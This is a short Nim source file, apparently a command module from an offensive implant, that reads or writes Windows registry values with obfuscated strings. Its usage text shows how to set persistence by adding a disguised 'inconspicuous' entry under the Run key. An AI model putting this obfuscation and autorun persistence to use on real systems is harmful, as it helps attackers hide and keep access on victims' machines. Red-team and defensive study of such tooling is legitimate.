import registry
from strutils import join, split, startsWith

# Query or modify the Windows registry
proc reg*(args : varargs[string]) : string =

    var
        command : string
        path : string
        key : string
        value : string
        handleStr : string
        regPath : string
        handle : registry.HKEY

    # Parse arguments
    case args.len:
        of 2:
            command = args[0]
            path = args[1]
            key = obf("(Default)")
        of 3:
            command = args[0]
            path = args[1]
            key = args[2]
        of 4:
            command = args[0]
            path = args[1]
            key = args[2]
            value = args[3 .. ^1].join(obf(" "))
        else:
            result = obf("Invalid number of arguments received. Usage: 'reg [query|add] [path] <optional: key> <optional: value>'. Example: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run inconspicuous calc.exe'")
            return

    # Parse the registry path
    try:
        handleStr = path.split(obf("\\"))[0]
        regPath = path.split(obf("\\"), 1)[1]
    except:
        result = obf("Unable to parse registry path. Please use format: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'.")
        return

    # Identify the correct hive from the parsed path
    if handleStr.startsWith(obf("hkcu")):
        handle = registry.HKEY_CURRENT_USER
    elif handleStr.startsWith(obf("hklm")):
        handle = registry.HKEY_LOCAL_MACHINE
    else:
        result = obf("Invalid registry. Only 'HKCU' and 'HKLM' are supported at this time.")
        return

    # Query an existing registry value
    if command == obf("query"):
        result = getUnicodeValue(regPath, key, handle)

    # Add a value to the registry
    elif command == obf("add"):
        setUnicodeValue(regPath, key, value, handle)
        result = obf("Successfully set registry value.")

    else:
        result = obf("Unknown reg command. Please use 'reg query' or 'reg add' followed by the path (and value when adding a key).")
        return